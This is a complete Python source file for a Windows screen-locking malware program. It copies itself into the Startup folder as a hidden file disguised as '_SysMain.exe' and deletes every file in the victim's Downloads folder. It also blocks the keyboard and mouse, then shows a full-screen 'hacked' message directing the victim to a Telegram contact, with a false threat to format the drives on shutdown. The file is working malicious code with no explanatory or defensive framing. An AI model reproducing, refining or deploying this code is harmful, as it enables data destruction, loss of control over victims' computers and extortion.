from tkinter import *
import pyautogui
import threading
import keyboard
import os
import time
import winreg as reg
import shutil



def unshow_file(path, file):
	now_path = os.getcwd()
	os.chdir(path)
	os.system(f'attrib +h +s +r {file}')
	os.chdir(now_path)

def add_to_startup():
	mainFileData = open(os.path.abspath(sys.argv[0]), 'rb').read()

	try:
		open(f'{os.environ["USERPROFILE"]}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\_SysMain.exe', 'wb').write(mainFileData)
		unshow_file(f'{os.environ["USERPROFILE"]}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup', '_SysMain.exe')
	except Exception as error: print(error)

	for file in [obj for obj in os.walk(f'{os.environ["USERPROFILE"]}\\Downloads')][0][2]:
		try: os.remove(f'{os.environ["USERPROFILE"]}\\Downloads\\{file}', dir_fd=None)
		except: pass

	try: os.remove(os.path.abspath(sys.argv[0]), dir_fd=None)
	except: pass


class BlockKeyboard:
	def __init__(self):
		self.modifKeys = keyboard.all_modifiers
		self.ordinaryKeys = 'abcdefghigklmnopqrstuvwxyz1234567890-=,./'
		self.anotherKeys = ['space', 'backspace', 'del', 'insert', 'esc', 'numlock', 'tab', 'enter']
		self.fKeys = ['f' + str(i) for i in range(1, 13)]

	def block(self):
		for key in list(self.modifKeys) + list(self.ordinaryKeys) + self.anotherKeys:
			try: keyboard.block_key(key)
			except Exception as error: print(f'Error when blocking key "{key}": {error}')

	def unblock(self):
		for key in list(self.modifKeys) + list(self.ordinaryKeys) + self.anotherKeys:
			try: keyboard.unblock_key(key)
			except Exception as error: print(f'Error when unblocking key "{key}": {error}')


class BlockMouse:
	def __init__(self):
		self.IFBLOCK = False
		threading.Thread(target=self.lock, daemon=True).start()

	def block(self): self.IFBLOCK = True
	def unblock(self): self.IFBLOCK = False

	def lock(self):
		while True:
			if self.IFBLOCK:
				try:
					pyautogui.moveTo(
							round(pyautogui.size()[0] / 2),
							round(pyautogui.size()[1] / 2)
						)
				except: pass

			time.sleep(0.1)


class Locker(Tk):
	def __init__(self, mtext="You has been hacked!", stext='\n'):
		Tk.__init__(self)

		self.attributes("-fullscreen", True)
		self.configure(bg="black")
		self.config(cursor="none")

		Label(self, text=mtext, fg="red", bg="black", font=("Arial", 32)).pack()
		Label(self, text=stext, fg="red", bg="black", font=("Arial", 14)).pack()


	def start(self):
		self.mainloop()

	def close(self):
		self.destroy()



def main():
	add_to_startup()

	MAIN_TEXT = "\nHello! Im so sorry, but u has been hacked :C\nYou need to text to the my creator\n (@JustAModerator in telegramm) to solve this problem.\nYour $Admin ;3"
	SMALL_TEXT = "\n\nIf you turn off your computer - this programm will format all your hard drives."

	bk = BlockKeyboard()
	bm = BlockMouse()

	bk.block()
	bm.block()

	locker = Locker(mtext=MAIN_TEXT, stext=SMALL_TEXT)
	locker.start()


if __name__ == '__main__': main()
